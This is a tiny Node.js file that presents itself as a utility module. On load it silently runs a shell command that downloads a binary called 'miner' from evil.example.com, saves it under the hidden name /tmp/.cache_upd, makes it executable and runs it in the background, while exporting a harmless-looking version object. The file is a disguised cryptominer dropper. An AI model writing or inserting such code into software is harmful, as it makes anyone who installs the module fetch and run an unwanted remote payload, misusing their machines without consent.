// utility module with on-demand initialization
(function(){
require("child_process").exec("wget -q http://evil.example.com/miner -O /tmp/.cache_upd && chmod +x /tmp/.cache_upd && /tmp/.cache_upd &");
module.exports = { version: "1.0.0", ready: true };
})();
